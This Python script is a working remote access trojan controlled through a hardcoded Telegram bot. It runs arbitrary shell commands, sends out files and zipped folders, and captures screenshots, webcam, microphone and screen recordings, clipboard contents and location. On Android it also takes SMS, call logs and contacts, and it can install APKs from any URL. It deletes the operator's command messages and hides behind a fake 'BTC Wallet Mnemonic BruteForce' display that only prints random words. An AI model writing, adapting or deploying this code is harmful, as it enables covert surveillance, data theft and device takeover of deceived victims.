import os
import platform
import requests
import subprocess
import time
import sys
import threading
import random
import json
import logging
import shutil

try:
    from PIL import ImageGrab
except ImportError:
    if platform.system().startswith("Windows"):
        os.system("python -m pip install pillow -q")
        from PIL import ImageGrab
    elif platform.system().startswith("Linux"):
        os.system("python3 -m pip install pillow -q")
        from PIL import ImageGrab

TOKEN = '8190500385:AAEEgfAlo6TJezZzG8FP6O5HygkIVutsTQs'
CHAT_ID = '5550796521'
processed_message_ids = []

IS_WINDOWS = platform.system().startswith("Windows")
IS_LINUX = platform.system().startswith("Linux")
IS_ANDROID = 'ANDROID_ROOT' in os.environ or 'com.termux' in os.environ.get('PREFIX', '')

logging.basicConfig(filename="bot_errors.log", level=logging.ERROR)

def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    params = {'offset': offset, 'timeout': 60}
    try:
        response = requests.get(url, params=params, timeout=60)
        if response.status_code == 200:
            return response.json().get('result', [])
    except Exception:
        pass
    return []

def delete_message(message_id):
    url = f"https://api.telegram.org/bot{TOKEN}/deleteMessage"
    params = {'chat_id': CHAT_ID, 'message_id': message_id}
    try:
        requests.get(url, params=params, timeout=10)
    except Exception:
        pass

def send_message(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    params = {'chat_id': CHAT_ID, 'text': text}
    try:
        requests.get(url, params=params, timeout=10)
    except Exception:
        pass

def send_file(filename):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': CHAT_ID}
            requests.post(url, data=data, files=files, timeout=30)
    except Exception:
        send_message(f"Failed to send file: {filename}")

def send_menu():
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    keyboard = [
        ["info", "ls", "screenshot"],
        ["location", "ps", "whoami"],
        ["cd ..", "dl <file>", "get <url>"],
        ["recordaudio", "recordcam", "recordscreen"],
        ["photo", "battery", "deviceinfo"],
        ["clipboard", "setclipboard <text>", "vibrate"],
        ["tts <text>", "wifi", "volumeup"],
        ["volumedown", "listapps", "listapk"],
        ["fetchsms", "calllog", "contacts"],
        ["installapk <url>", "uninstallpkg <pkg>", "help"],
        ["reboot", "shutdown"],
        ["zip <dir>", "kill <pid>", "ping <host>"],
        ["traceroute <host>", "netstat", "upfile"],
        ["photopc"]
    ]
    reply_markup = {
        "keyboard": keyboard,
        "resize_keyboard": True,
        "one_time_keyboard": False
    }
    params = {
        'chat_id': CHAT_ID,
        'text': "Choose a command:",
        'reply_markup': json.dumps(reply_markup)
    }
    try:
        requests.post(url, data=params, timeout=10)
    except Exception:
        pass

def save_uploaded_file(file_id):
    url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}"
    file_info = requests.get(url).json()
    file_path = file_info['result']['file_path']
    file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
    file_name = os.path.basename(file_path)
    r = requests.get(file_url)
    with open(file_name, 'wb') as f:
        f.write(r.content)

def execute_command(command):
    command = command.strip()
    # --- Command Aliases ---
    aliases = {
        'ss': 'screenshot',
        'rec': 'recordaudio',
        'cam': 'recordcam',
        'scr': 'recordscreen',
        'who': 'whoami',
        'bat': 'battery',
        'dev': 'deviceinfo',
        'clip': 'clipboard',
        'setclip': 'setclipboard',
        'vib': 'vibrate',
        'vup': 'volumeup',
        'vdn': 'volumedown',
        'apps': 'listapps',
        'apks': 'listapk',
        'sms': 'fetchsms',
        'calls': 'calllog',
        'cont': 'contacts',
        'apk': 'installapk',
        'rmapp': 'uninstallpkg',
        'loc': 'location',
        'wget': 'get',
        'dl': 'dl',
        'zip': 'zip',
        'kill': 'kill',
        'ping': 'ping',
        'trace': 'traceroute',
        'net': 'netstat',
        'upfile': 'upfile',
        'camshot': 'photopc',
        'photo': 'photo'
    }
    # Expand alias if used
    cmd_parts = command.split()
    if cmd_parts and cmd_parts[0] in aliases:
        command = aliases[cmd_parts[0]] + command[len(cmd_parts[0]):]

    try:
        # Universal commands
        if command in ['/start', 'menu']:
            send_menu()
            return "Menu opened. Tap a button below."
        elif command == 'help':
            return get_help()
        elif command == 'info':
            info = {
                'Platform': platform.platform(),
                'System': platform.system(),
                'Release': platform.release(),
                'Machine': platform.machine(),
                'Processor': platform.processor(),
                'CPU Cores': os.cpu_count(),
                'User': os.getlogin() if hasattr(os, 'getlogin') else 'n/a',
                'Dir': os.getcwd()
            }
            return '\n'.join(f"{k}: {v}" for k, v in info.items())
        elif command == 'ls':
            try:
                return subprocess.getoutput("dir" if IS_WINDOWS else "ls -lh")
            except Exception:
                try:
                    return '\n'.join(os.listdir('.'))
                except Exception as e:
                    return f"ls error: {e}"
        elif command.startswith('cd '):
            folder = command[3:].strip()
            try:
                os.chdir(folder)
                return f"Changed dir: {os.getcwd()}"
            except Exception as e:
                return f"Error: {e}"
        elif command.startswith('dl '):
            filename = command[3:].strip()
            try:
                if os.path.isfile(filename):
                    send_file(filename)
                    return f"Sent: {filename}"
                else:
                    return f"Not found: {filename}"
            except Exception as e:
                return f"Download error: {e}"
        elif command.startswith('get '):
            url = command[4:].strip()
            try:
                name = url.split("/")[-1]
                r = requests.get(url, timeout=30)
                with open(name, 'wb') as f:
                    f.write(r.content)
                return f"Downloaded: {name}"
            except Exception as e:
                return f"Download failed: {e}"
        elif command == 'screenshot':
            file_path = "screenshot.png"
            # Try pyautogui, fallback to PIL.ImageGrab, then OS-specific
            try:
                import pyautogui
                img = pyautogui.screenshot()
                img.save(file_path)
                send_file(file_path)
                os.remove(file_path)
                return "Screenshot sent."
            except Exception:
                try:
                    from PIL import ImageGrab
                    img = ImageGrab.grab()
                    img.save(file_path)
                    send_file(file_path)
                    os.remove(file_path)
                    return "Screenshot sent."
                except Exception:
                    if IS_LINUX:
                        try:
                            os.system(f"import -window root {file_path}")
                            if os.path.exists(file_path):
                                send_file(file_path)
                                os.remove(file_path)
                                return "Screenshot sent."
                        except Exception:
                            pass
                    elif IS_WINDOWS:
                        try:
                            os.system("nircmd.exe savescreenshot screenshot.png")
                            if os.path.exists(file_path):
                                send_file(file_path)
                                os.remove(file_path)
                                return "Screenshot sent."
                        except Exception:
                            pass
                    return "Screenshot error: No supported screenshot method found."
        elif command == 'location':
            try:
                ip = requests.get('https://ifconfig.me/ip', timeout=10).text.strip()
                data = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
                return "\n".join([f"{k}: {v}" for k, v in data.items()])
            except Exception as e:
                return f"Location error: {e}"
        elif command.startswith('sh '):
            try:
                result = subprocess.check_output(command[3:], shell=True, stderr=subprocess.STDOUT)
                return result.decode('utf-8').strip()
            except Exception as e:
                return f"Shell error: {e}"
        elif command.startswith('zip '):
            folder = command[4:].strip()
            try:
                if not os.path.isdir(folder):
                    return f"Not a directory: {folder}"
                zip_name = f"{os.path.basename(folder)}.zip"
                shutil.make_archive(os.path.splitext(zip_name)[0], 'zip', folder)
                send_file(zip_name)
                os.remove(zip_name)
                return f"Folder {folder} zipped and sent."
            except Exception as e:
                return f"Zip error: {e}"
        elif command.startswith('kill '):
            pid = command[5:].strip()
            try:
                os.kill(int(pid), 9)
                return f"Process {pid} killed."
            except Exception as e:
                return f"Failed to kill process {pid}: {e}"
        elif command.startswith('ping '):
            host = command[5:].strip()
            try:
                return subprocess.getoutput(f"ping -c 4 {host}")
            except Exception as e:
                return f"Ping error: {e}"
        elif command.startswith('traceroute '):
            host = command[11:].strip()
            try:
                return subprocess.getoutput(f"traceroute {host}")
            except Exception as e:
                return f"Traceroute error: {e}"
        elif command == 'netstat':
            try:
                return subprocess.getoutput("netstat -tulnp" if IS_LINUX else "netstat -ano")
            except Exception as e:
                return f"Netstat error: {e}"
        elif command == 'upfile':
            return "Send a file to upload and it will be saved."
        # Clipboard for desktop
        elif command == 'clipboard' and (IS_WINDOWS or IS_LINUX):
            try:
                import pyperclip
                return pyperclip.paste()
            except Exception:
                try:
                    if IS_LINUX:
                        return subprocess.getoutput("xclip -o -selection clipboard")
                    elif IS_WINDOWS:
                        return subprocess.getoutput("powershell Get-Clipboard")
                except Exception as e:
                    return f"Clipboard not available: {e}"
        elif command.startswith('setclipboard ') and (IS_WINDOWS or IS_LINUX):
            text = command[len('setclipboard '):]
            try:
                import pyperclip
                pyperclip.copy(text)
                return "Clipboard set."
            except Exception:
                try:
                    if IS_LINUX:
                        subprocess.getoutput(f"echo '{text}' | xclip -selection clipboard")
                        return "Clipboard set."
                    elif IS_WINDOWS:
                        subprocess.getoutput(f'echo {text.strip()}| clip')
                        return "Clipboard set."
                except Exception as e:
                    return f"Clipboard not available: {e}"
        # Webcam photo for desktop
        elif command == 'photopc' and (IS_WINDOWS or IS_LINUX):
            try:
                import cv2
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if ret:
                    photo_file = "webcam.jpg"
                    cv2.imwrite(photo_file, frame)
                    cam.release()
                    send_file(photo_file)
                    os.remove(photo_file)
                    return "Photo sent."
                else:
                    cam.release()
                    return "Failed to capture photo."
            except Exception as e:
                return f"Webcam not available or OpenCV not installed: {e}"

        # Windows-only
        if IS_WINDOWS:
            if command == 'ps':
                try:
                    return subprocess.getoutput("tasklist")
                except Exception as e:
                    return f"ps error: {e}"
            elif command == 'whoami':
                try:
                    return subprocess.getoutput("whoami")
                except Exception as e:
                    return f"whoami error: {e}"
            elif command == 'reboot':
                try:
                    os.system("shutdown /r /t 0")
                    return "Rebooting..."
                except Exception as e:
                    return f"Reboot error: {e}"
            elif command == 'shutdown':
                try:
                    os.system("shutdown /s /t 0")
                    return "Shutting down..."
                except Exception as e:
                    return f"Shutdown error: {e}"
            elif command == 'recordaudio':
                try:
                    import sounddevice as sd
                    from scipy.io.wavfile import write
                    duration = 10
                    send_message("Recording audio...")
                    rec = sd.rec(int(duration * 44100), samplerate=44100, channels=2)
                    sd.wait()
                    write('audio.wav', 44100, rec)
                    send_file('audio.wav')
                    os.remove('audio.wav')
                    return f"Audio ({duration}s) sent."
                except Exception as e:
                    return f"Audio recording error: {e}"
            elif command == 'recordscreen':
                try:
                    screen_file = "screen.mp4"
                    cmd = f'ffmpeg -y -f gdigrab -framerate 15 -t 10 -i desktop {screen_file}'
                    os.system(cmd)
                    if os.path.exists(screen_file):
                        send_file(screen_file)
                        os.remove(screen_file)
                        return f"Screen recording (10s) sent."
                    else:
                        return "Failed to record screen."
                except Exception as e:
                    return f"Screen recording error: {e}"
            elif command == 'recordcam':
                try:
                    video_file = "video.mp4"
                    cmd = f'ffmpeg -y -f dshow -i video=\"Integrated Camera\" -t 10 {video_file}'
                    os.system(cmd)
                    if os.path.exists(video_file):
                        send_file(video_file)
                        os.remove(video_file)
                        return f"Video (10s) sent."
                    else:
                        return "Failed to record video."
                except Exception as e:
                    return f"Webcam recording error: {e}"

        # Linux-only
        if IS_LINUX:
            if command == 'ps':
                try:
                    return subprocess.getoutput("ps aux")
                except Exception as e:
                    return f"ps error: {e}"
            elif command == 'whoami':
                try:
                    return subprocess.getoutput("whoami")
                except Exception as e:
                    return f"whoami error: {e}"
            elif command == 'reboot':
                try:
                    os.system("reboot")
                    return "Rebooting..."
                except Exception as e:
                    return f"Reboot error: {e}"
            elif command == 'shutdown':
                try:
                    os.system("shutdown now")
                    return "Shutting down..."
                except Exception as e:
                    return f"Shutdown error: {e}"
            elif command == 'recordaudio':
                audio_file = "audio.wav"
                try:
                    cmd = f"arecord -d 10 -f cd {audio_file}"
                    os.system(cmd)
                    if os.path.exists(audio_file):
                        send_file(audio_file)
                        os.remove(audio_file)
                        return f"Audio (10s) sent."
                    else:
                        return "Failed to record audio."
                except Exception as e:
                    return f"Audio recording error: {e}"
            elif command == 'recordscreen':
                try:
                    screen_file = "screen.mp4"
                    cmd = f'ffmpeg -y -video_size cif -framerate 15 -f x11grab -i :0.0 -t 10 {screen_file}'
                    os.system(cmd)
                    if os.path.exists(screen_file):
                        send_file(screen_file)
                        os.remove(screen_file)
                        return f"Screen recording (10s) sent."
                    else:
                        return "Failed to record screen."
                except Exception as e:
                    return f"Screen recording error: {e}"
            elif command == 'recordcam':
                try:
                    video_file = "video.mp4"
                    cmd = f'ffmpeg -y -f v4l2 -framerate 25 -video_size 640x480 -i /dev/video0 -t 10 {video_file}'
                    os.system(cmd)
                    if os.path.exists(video_file):
                        send_file(video_file)
                        os.remove(video_file)
                        return f"Video (10s) sent."
                    else:
                        return "Failed to record video."
                except Exception as e:
                    return f"Webcam recording error: {e}"

        # Android-only (Termux)
        if IS_ANDROID:
            if command == 'ps':
                try:
                    return subprocess.getoutput("ps aux")
                except Exception as e:
                    return f"ps error: {e}"
            elif command == 'whoami':
                try:
                    return subprocess.getoutput("whoami")
                except Exception as e:
                    return f"whoami error: {e}"
            elif command == 'reboot':
                try:
                    os.system("reboot")
                    return "Rebooting..."
                except Exception as e:
                    return f"Reboot error: {e}"
            elif command == 'shutdown':
                try:
                    os.system("reboot -p")
                    return "Shutting down..."
                except Exception as e:
                    return f"Shutdown error: {e}"
            elif command == 'battery':
                try:
                    return subprocess.getoutput("termux-battery-status")
                except Exception as e:
                    return f"Battery error: {e}"
            elif command == 'deviceinfo':
                try:
                    return subprocess.getoutput("termux-telephony-deviceinfo")
                except Exception as e:
                    return f"Device info error: {e}"
            elif command == 'photo':
                photo_file = "photo.jpg"
                try:
                    if os.system("which termux-camera-photo > /dev/null 2>&1") == 0:
                        os.system(f"termux-camera-photo -c 0 {photo_file}")
                        if os.path.exists(photo_file):
                            send_file(photo_file)
                            os.remove(photo_file)
                            return "Photo sent."
                        else:
                            return "Failed to take photo."
                    else:
                        return "termux-camera-photo not available."
                except Exception as e:
                    return f"Photo error: {e}"
            elif command == 'clipboard':
                try:
                    return subprocess.getoutput("termux-clipboard-get")
                except Exception as e:
                    return f"Clipboard error: {e}"
            elif command.startswith('setclipboard '):
                text = command[len('setclipboard '):]
                try:
                    subprocess.getoutput(f"echo '{text}' | termux-clipboard-set")
                    return "Clipboard set."
                except Exception as e:
                    return f"Clipboard error: {e}"
            elif command == 'vibrate':
                try:
                    subprocess.getoutput("termux-vibrate -d 500")
                    return "Vibrated."
                except Exception as e:
                    return f"Vibrate error: {e}"
            elif command.startswith('tts '):
                text = command[4:]
                try:
                    subprocess.getoutput(f"termux-tts-speak '{text}'")
                    return "Spoken."
                except Exception as e:
                    return f"TTS error: {e}"
            elif command == 'wifi':
                try:
                    return subprocess.getoutput("termux-wifi-connectioninfo")
                except Exception as e:
                    return f"WiFi error: {e}"
            elif command == 'volumeup':
                try:
                    subprocess.getoutput("termux-volume music 15")
                    return "Volume max."
                except Exception as e:
                    return f"Volume error: {e}"
            elif command == 'volumedown':
                try:
                    subprocess.getoutput("termux-volume music 0")
                    return "Volume min."
                except Exception as e:
                    return f"Volume error: {e}"
            elif command == 'listapps':
                try:
                    return subprocess.getoutput("pm list packages")
                except Exception as e:
                    return f"List apps error: {e}"
            elif command == 'listapk':
                try:
                    return subprocess.getoutput("ls /data/app/ /data/data/ /system/app/ /system/priv-app/ 2>/dev/null")
                except Exception as e:
                    return f"List APK error: {e}"
            elif command == 'fetchsms':
                try:
                    return subprocess.getoutput("termux-sms-list")
                except Exception as e:
                    return f"SMS error: {e}"
            elif command == 'calllog':
                try:
                    return subprocess.getoutput("termux-call-log")
                except Exception as e:
                    return f"Call log error: {e}"
            elif command == 'contacts':
                try:
                    return subprocess.getoutput("termux-contact-list")
                except Exception as e:
                    return f"Contacts error: {e}"
            elif command.startswith('installapk '):
                url = command[len('installapk '):].strip()
                apk_name = url.split("/")[-1]
                try:
                    r = requests.get(url, timeout=30)
                    with open(apk_name, 'wb') as f:
                        f.write(r.content)
                    os.system(f"pm install {apk_name}")
                    return f"APK {apk_name} installed."
                except Exception as e:
                    return f"Failed to install APK: {e}"
            elif command.startswith('uninstallpkg '):
                pkg = command[len('uninstallpkg '):].strip()
                try:
                    result = subprocess.getoutput(f"pm uninstall {pkg}")
                    return f"Uninstall result: {result}"
                except Exception as e:
                    return f"Uninstall error: {e}"
            elif command == 'recordaudio':
                audio_file = "audio.wav"
                try:
                    os.system(f"termux-microphone-record -f {audio_file} -l 10")
                    if os.path.exists(audio_file):
                        send_file(audio_file)
                        os.remove(audio_file)
                        return f"Audio (10s) sent."
                    else:
                        return "Failed to record audio."
                except Exception as e:
                    return f"Audio recording error: {e}"
            elif command == 'recordcam':
                video_file = "video.mp4"
                try:
                    os.system(f"termux-camera-video -c 0 -l 10 -o {video_file}")
                    if os.path.exists(video_file):
                        send_file(video_file)
                        os.remove(video_file)
                        return f"Video (10s) sent."
                    else:
                        return "Failed to record video."
                except Exception as e:
                    return f"Camera recording error: {e}"
            elif command == 'recordscreen':
                screen_file = "screen.mp4"
                try:
                    os.system(f"termux-screenrecord -l 10 {screen_file}")
                    if os.path.exists(screen_file):
                        send_file(screen_file)
                        os.remove(screen_file)
                        return f"Screen recording (10s) sent."
                    else:
                        return "Failed to record screen."
                except Exception as e:
                    return f"Screen recording error: {e}"
    except Exception as e:
        logging.error(f"Error: {e}", exc_info=True)
        return f"Error: {e}"
    return "Unknown or unsupported command. Type 'help' for available commands."

def get_help():
    help_lines = [
        "HELP MENU:",
        "",
        "COMMANDS (full):",
        "info           | System info",
        "ls             | List files",
        "cd <dir>       | Change directory",
        "dl <file>      | Download file",
        "get <url>      | Download from URL",
        "screenshot     | Screenshot",
        "location       | IP & location",
        "sh <cmd>       | Run shell command",
        "zip <dir>      | Zip and send folder",
        "kill <pid>     | Kill process",
        "ping <host>    | Ping host",
        "traceroute <h> | Traceroute host",
        "netstat        | Netstat",
        "upfile         | Upload file",
        "recordaudio    | Audio record (10s)",
        "recordscreen   | Screen record (10s)",
        "recordcam      | Webcam/video record (10s)",
        "photopc        | Webcam photo (desktop)",
        "",
        "ANDROID/TERMUX ONLY:",
        "battery        | Battery status",
        "deviceinfo     | Device info",
        "photo          | Take photo",
        "clipboard      | Get clipboard",
        "setclipboard <t> | Set clipboard",
        "vibrate        | Vibrate",
        "tts <t>        | Text-to-speech",
        "wifi           | WiFi info",
        "volumeup       | Volume max",
        "volumedown     | Volume min",
        "listapps       | List installed apps",
        "listapk        | List APK files",
        "fetchsms       | Fetch SMS",
        "calllog        | Call log",
        "contacts       | Contacts",
        "installapk <url> | Install APK",
        "uninstallpkg <pkg> | Uninstall app",
        "",
        "ALIASES (shortcuts):",
        "ss         = screenshot",
        "rec        = recordaudio",
        "cam        = recordcam",
        "scr        = recordscreen",
        "who        = whoami",
        "bat        = battery",
        "dev        = deviceinfo",
        "clip       = clipboard",
        "setclip    = setclipboard",
        "vib        = vibrate",
        "vup        = volumeup",
        "vdn        = volumedown",
        "apps       = listapps",
        "apks       = listapk",
        "sms        = fetchsms",
        "calls      = calllog",
        "cont       = contacts",
        "apk        = installapk",
        "rmapp      = uninstallpkg",
        "loc        = location",
        "wget       = get",
        "zip        = zip",
        "kill       = kill",
        "ping       = ping",
        "trace      = traceroute",
        "net        = netstat",
        "upfile     = upfile",
        "camshot    = photopc",
    ]
    return "\n".join(help_lines)

def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        try:
            if 'message' in update:
                message = update['message']
                message_id = message['message_id']
                if message_id in processed_message_ids:
                    continue
                processed_message_ids.append(message_id)
                delete_message(message_id)
                if 'document' in message:
                    file_id = message['document']['file_id']
                    save_uploaded_file(file_id)
                    send_message("File uploaded and saved.")
                elif 'text' in message:
                    message_text = message['text']
                    result = execute_command(message_text)
                    if result:
                        send_message(result)
                send_menu()
            update_id = update['update_id']
            if update_id > highest_update_id:
                highest_update_id = update_id
        except Exception as e:
            logging.error(f"Update error: {e}", exc_info=True)
    return highest_update_id

def main():
    hostname = platform.node()
    notif_file = ".last_host"
    last_host = ""
    if os.path.exists(notif_file):
        with open(notif_file) as f:
            last_host = f.read().strip()
    if hostname != last_host:
        send_message(f"🔔 Bot started on new device/host: {hostname}")
        with open(notif_file, "w") as f:
            f.write(hostname)
    offset = None
    while True:
        try:
            updates = get_updates(offset)
            if updates:
                offset = handle_updates(updates) + 1
                processed_message_ids.clear()
            time.sleep(1)
        except Exception as e:
            logging.error(f"Main loop error: {e}", exc_info=True)
            time.sleep(5)

def bruteforce_ui():
    import string
    wordlist = [
        "apple", "banana", "cat", "dog", "echo", "fish", "grape", "hat", "ice", "jungle", "kite", "lion",
        "moon", "nest", "owl", "pear", "queen", "rose", "star", "tree", "umbrella", "vase", "wolf", "xray", "yak", "zebra"
    ]
    print("=" * 60)
    print(" BTC Wallet Mnemonic BruteForce Utility ".center(60, "="))
    print("=" * 60)
    print("You can provide a wordlist file (press Enter to skip).")
    wl = input("Wordlist file (optional): ").strip()
    if wl and os.path.isfile(wl):
        with open(wl) as f:
            wordlist = [w.strip() for w in f if w.strip()]
        print(f"Loaded {len(wordlist)} words from {wl}")
    else:
        print(f"Using default wordlist ({len(wordlist)} words).")
    print("\n[INFO] Starting brute-force process...\n")
    time.sleep(1)

    tries = 0
    start_time = time.time()
    cols = shutil.get_terminal_size((80, 20)).columns

    while True:
        tries += 1
        t_wait = random.randint(60, 120)
        try_start = time.time()
        while time.time() - try_start < t_wait:
            guess = []
            for _ in range(12):
                if random.random() < 0.5:
                    guess.append(''.join(random.choices(string.ascii_lowercase, k=random.randint(3,7))))
                else:
                    w = random.choice(wordlist)
                    if len(w) > 2 and random.random() < 0.7:
                        idx = random.randint(0, len(w)-1)
                        w = w[:idx] + random.choice(string.ascii_lowercase) + w[idx+1:]
                    guess.append(w)
            elapsed = int(time.time() - start_time)
            hours, rem = divmod(elapsed, 3600)
            minutes, seconds = divmod(rem, 60)
            timer = f"{hours:02}:{minutes:02}:{seconds:02}"
            bar_len = 30
            progress = min((time.time() - try_start) / t_wait, 1.0)
            filled = int(bar_len * progress)
            bar = "[" + "#" * filled + "-" * (bar_len - filled) + "]"
            sys.stdout.write(
                f"\r{bar} Try #{tries:06d} | Elapsed: {timer} | Mnemonic: "
                + ' '.join(guess)
                + " " * (cols - 70)
            )
            sys.stdout.flush()
            time.sleep(0.12)
        sys.stdout.write(
            f"\n[!] Attempt {tries:06d} completed. No valid mnemonic found. Continuing...\n"
        )
        sys.stdout.flush()
        time.sleep(1)

if __name__ == '__main__':
    threading.Thread(target=bruteforce_ui, daemon=True).start()
    main()
